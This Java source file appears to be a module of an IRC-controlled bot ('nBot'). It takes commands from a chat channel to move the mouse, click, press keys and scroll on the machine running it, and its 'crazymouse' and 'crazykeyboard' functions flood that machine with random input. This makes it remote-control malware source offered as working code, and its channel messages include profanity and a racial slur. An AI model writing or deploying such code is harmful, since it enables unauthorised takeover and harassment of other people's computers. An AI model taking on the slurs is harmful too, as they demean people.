
import java.awt.Robot;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import java.util.Set;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class RobotFunctions implements Handler {

    private static Robot robot;

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";movemouse")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Moving mouse to " + args[1] + ":" + args[2]);
            if (moveMouse(args[1], args[2])) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Moved sucsessfully!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error moving mouse!");
                return false;
            }
        }
        if (args[0].equals(";keypress")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Pressing selected keys!");
            String[] keys = args[1].split(",");
            if (keyPress(keys)) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Keys sucsessfully pressed!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error pressing keys!");
                return false;
            }
        }
        if (args[0].equals(";mousewheel")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Scrolling mouse!");
            if (mouseWheel(args[1])) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Mouse scrolled sucsessfully!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error scrolling mouse");
                return false;
            }
        }
        if (args[0].equals(";crazymouse")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Mouse is going crazy bitch!");
            if (crazyMouse()) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Crazy mouse completed!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error making mouse fucked up!");
                return false;
            }
        }
        if (args[0].equals(";crazykeyboard")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Making dis niggas keyboard crazy!");
            if (crazyKeyboard()) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Crazy keyboard cycle completed!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error with crazy keyboard!");
                return false;
            }
        }
        if (args[0].equals(";clickmouse")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Clicking mouse nigga!");
            if (args.length == 4) {
                if (moveAndClick(args[1], args[2], args[3])) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Clicked mouse sucsessfully!");
                    return true;
                } else {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error clicking mouse!");
                    return false;
                }
            } else if (args.length == 2) {
                if (clickMouse(args[1])) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Clicked mouse sucsessfully!");
                    return true;
                } else {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error clicking mouse!");
                    return false;
                }
            }
        }
        return false;
    }

    public static boolean moveMouse(String x, String y) {
        try {
            int xX = Integer.parseInt(x);
            int yY = Integer.parseInt(y);
            robot = new Robot();
            robot.mouseMove(xX, yY);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean clickMouse(String button) {
        try {
            robot = new Robot();
            if (button.equals("1")) {
                robot.mousePress(InputEvent.BUTTON1_MASK);
                robot.mouseRelease(InputEvent.BUTTON1_MASK);
            } else if (button.equals("2")) {
                robot.mousePress(InputEvent.BUTTON2_MASK);
                robot.mouseRelease(InputEvent.BUTTON2_MASK);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean moveAndClick(String x, String y, String button) {
        if (moveMouse(x, y) && clickMouse(button)) {
            return true;
        }
        return false;
    }

    public static boolean crazyMouse() {
        try {
            robot = new Robot();
            for (int i = 0; i < 20; i++) {
                Thread.sleep(500);
                robot.mouseMove(new Random().nextInt(500) + i, new Random().nextInt(500) + i);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean crazyKeyboard() {
        try {
            HashMap<String, Integer> keysReplace = getReplaceKeys();
            String[] randomKeys = {
                "a", "b", "c", "d", "e", "f", "g",
                "h", "i", "j", "k", "l", "m", "n",
                "o", "p", "q", "r", "s", "t", "u",
                "v", "w", "x", "y", "z", "enter"
            };
            robot = new Robot();
            for (int i = 0; i < 200; i++) {
                int random = new Random().nextInt(randomKeys.length);
                robot.keyPress(keysReplace.get(randomKeys[random]));
                Thread.sleep(20);
                robot.keyRelease(keysReplace.get(randomKeys[random]));
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean keyPress(String[] key) {
        try {
            robot = new Robot();
            ArrayList<Integer> keysToPress = new ArrayList<Integer>();
            HashMap<String, Integer> keysReplace = getReplaceKeys();
            Set keySet = keysReplace.keySet();
            for (String s : key) {
                robot.keyPress(keysReplace.get(s));
                robot.keyRelease(keysReplace.get(s));
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean mouseWheel(String amtS) {
        try {
            int amt = Integer.parseInt(amtS);
            robot = new Robot();
            robot.mouseWheel(amt);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static HashMap getReplaceKeys() {
        HashMap<String, Integer> keysReplace = new HashMap<String, Integer>();
        keysReplace.put("a", KeyEvent.VK_A);
        keysReplace.put("b", KeyEvent.VK_B);
        keysReplace.put("c", KeyEvent.VK_C);
        keysReplace.put("d", KeyEvent.VK_D);
        keysReplace.put("e", KeyEvent.VK_E);
        keysReplace.put("f", KeyEvent.VK_F);
        keysReplace.put("g", KeyEvent.VK_G);
        keysReplace.put("h", KeyEvent.VK_H);
        keysReplace.put("i", KeyEvent.VK_I);
        keysReplace.put("j", KeyEvent.VK_J);
        keysReplace.put("k", KeyEvent.VK_K);
        keysReplace.put("l", KeyEvent.VK_L);
        keysReplace.put("m", KeyEvent.VK_M);
        keysReplace.put("n", KeyEvent.VK_N);
        keysReplace.put("o", KeyEvent.VK_O);
        keysReplace.put("p", KeyEvent.VK_P);
        keysReplace.put("q", KeyEvent.VK_Q);
        keysReplace.put("r", KeyEvent.VK_R);
        keysReplace.put("s", KeyEvent.VK_S);
        keysReplace.put("t", KeyEvent.VK_T);
        keysReplace.put("u", KeyEvent.VK_U);
        keysReplace.put("v", KeyEvent.VK_V);
        keysReplace.put("w", KeyEvent.VK_W);
        keysReplace.put("x", KeyEvent.VK_X);
        keysReplace.put("y", KeyEvent.VK_Y);
        keysReplace.put("z", KeyEvent.VK_Z);
        keysReplace.put("1", KeyEvent.VK_1);
        keysReplace.put("2", KeyEvent.VK_2);
        keysReplace.put("3", KeyEvent.VK_3);
        keysReplace.put("4", KeyEvent.VK_4);
        keysReplace.put("5", KeyEvent.VK_5);
        keysReplace.put("6", KeyEvent.VK_6);
        keysReplace.put("7", KeyEvent.VK_7);
        keysReplace.put("8", KeyEvent.VK_8);
        keysReplace.put("9", KeyEvent.VK_9);
        keysReplace.put("0", KeyEvent.VK_0);
        keysReplace.put(" ", KeyEvent.VK_SPACE);
        keysReplace.put("shft", KeyEvent.VK_SHIFT);
        keysReplace.put("alt", KeyEvent.ALT_DOWN_MASK);
        keysReplace.put("space", KeyEvent.VK_SPACE);
        keysReplace.put("enter", KeyEvent.VK_ENTER);
        keysReplace.put("bkspace", KeyEvent.VK_BACK_SPACE);
        keysReplace.put("windws", KeyEvent.VK_WINDOWS);
        return keysReplace;
    }
}
